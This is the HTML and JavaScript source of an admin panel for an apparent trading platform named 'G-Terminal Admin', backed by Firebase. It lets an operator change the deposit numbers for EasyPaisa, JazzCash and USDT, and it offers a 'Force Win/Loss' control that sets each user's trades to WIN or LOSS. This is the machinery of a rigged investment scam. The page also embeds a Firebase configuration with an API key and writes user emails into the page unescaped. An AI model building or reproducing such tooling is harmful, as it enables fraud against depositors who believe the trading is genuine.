<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>G-Terminal Admin</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <style>
        body { background: #0b0e11; color: white; font-family: sans-serif; padding: 20px; }
        .box { background: #1e2329; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #2b3139; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; border: 1px solid #2b3139; text-align: left; }
        button { padding: 5px 10px; cursor: pointer; border: none; border-radius: 3px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="box">
        <h3>Update Deposit Numbers</h3>
        <input type="text" id="pay-val" placeholder="Number/Address" style="padding:10px;">
        <select id="pay-meth" style="padding:10px;">
            <option value="easypaisa">EasyPaisa</option>
            <option value="jazzcash">JazzCash</option>
            <option value="trc20">USDT</option>
        </select>
        <button onclick="savePay()" style="background:#f0b90b;">Update</button>
    </div>

    <div class="box">
        <h3>User Management (Force Win/Loss)</h3>
        <table id="user-list">
            <tr><th>Email</th><th>Balance</th><th>Control</th><th>Action</th></tr>
        </table>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function savePay() {
            const m = document.getElementById('pay-meth').value;
            const v = document.getElementById('pay-val').value;
            db.ref('admin_settings/payments/' + m).set(v).then(() => alert("Saved!"));
        }

        db.ref('users').on('value', snap => {
            const users = snap.val();
            let html = '<tr><th>Email</th><th>Balance</th><th>Control</th><th>Action</th></tr>';
            for(let id in users) {
                html += `<tr>
                    <td>${users[id].email}</td>
                    <td>$${users[id].balance}</td>
                    <td style="color:#f0b90b">${users[id].control}</td>
                    <td>
                        <button onclick="setMode('${id}', 'WIN')" style="background:#02c076">WIN</button>
                        <button onclick="setMode('${id}', 'LOSS')" style="background:#f6465d">LOSS</button>
                        <button onclick="setMode('${id}', 'NORMAL')">X</button>
                    </td>
                </tr>`;
            }
            document.getElementById('user-list').innerHTML = html;
        });

        function setMode(id, mode) {
            db.ref('users/' + id).update({ control: mode });
        }
    </script>
</body>
</html>
